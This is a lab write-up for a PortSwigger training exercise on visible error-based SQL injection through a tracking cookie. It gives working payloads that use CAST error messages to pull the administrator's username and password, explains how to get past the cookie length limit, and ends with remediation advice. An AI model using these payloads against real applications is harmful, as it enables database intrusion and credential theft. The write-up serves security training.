## Metadata

- **Difficulty:** Practitioner
- **Category:** SQL Injection
- **Lab URL:** [Lab: Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
- **Date Solved:** 10-4-2026
## Vulnerability Summary

The app is vulnerable to SQL injection via its tracking cookie. The `TrackingId` cookie value is concatenated directly into a backend SQL query without sanitization. When injected there, the misconfigured app returns verbose SQL error messages, leaking sensitive data about the database. 
## Reconnaissance

- Injecting the payload `'`  into the cookie `Cookie: TrackingID = abc` gives us a `500 Internal Server Error` HTTP Response and the error message `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'vrF9rZHIYBzwyT9u''. Expected  char`.  Meanwhile ,`''` gives us a `200 OK`. This confirms that the app is vulnerable to SQLi, as the `500 Internal Server Error` when `'` is being injected is due to a SQL syntax error. 
## Exploitation Steps

These steps are written assuming that the `users` exists, contains login credentials, and includes columns named `username` and `password`, per the lab's description. 
1. Click on any category under the "Refine your search:" to get a legitimate, usable cookie `TrackingID`. Intercept this request with Burp Suite proxy, and send the request to Burp Suite Repeater.
2. Since logical operators (like the `AND` we're looking to inject) require boolean operands, we cannot just plainly `SELECT username FROM users`. Instead, we use the function `CAST()` and specifically the payload `' AND 1=CAST((SELECT username FROM users) AS int)--`. Though this is the correct payload, the error message in the HTTP response will now be `Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'vrF9rZHIYBzwyT9u' AND 1=CAST((SELECT username FROM users) AS'. Expected  char`. It is observable that our payload was truncated, probably due to a hard limit on the length of the HTTP header or the specific cookie value it will process. We need to delete the value of field `TrackingID` completely. Resend the payload, and you will receive an error message that reads `ERROR: more than one row returned by a subquery used as an expression`. It appears that the subquery is only allowed to return exactly one row. Using this information, we send the payload `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` to get the error message `ERROR: invalid input syntax for type integer: "administrator"`. This confirms that the login credentials for the username `admnistrator` is on the first row of the `users` table.
3. Now we need to find the password that belongs to the username `administrator`. Knowing that the login credentials for them are on the first row, we simply inject `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` to receive the error message `ERROR: invalid input syntax for type integer: "randomstring"` (the password differs from section to section). Go on the website and fill in the login form with the credentials we just obtained, and you would see that we're logged in as administrator. Lab is solved!
## Payload Used

`' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` 
`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
By casting the `SELECT` statement as int and prepending the `1=`, we create a valid boolean expression. This helps the queries pass syntax validation and get to execution by the database.
## Root Cause

User-controlled input is concatenated into a SQL query with no escaping or parameterization.
## Remediation

1. Parameterized queries (prepared statement):
```python
query = "SELECT tracking_id FROM tracking_table WHERE tracking_id = ?"
cursor.execute(query, (tracking_id,))
```
2. Strict regex input validation to prevent injection: `^[a-zA-Z0-9]{32}$`.
3. Disable verbose error messages. The application is leaking sensitive database architecture and stored data through its HTTP responses. In a production environment, verbose database errors must be suppressed. Implement generic error handling that returns a standard HTTP 500 error page to the user, while securely logging the detailed stack trace internally for debugging purposes.
4. Adopting Principle of Least Privilege (PoLP). User should only have rights to `SELECT` tables they need. 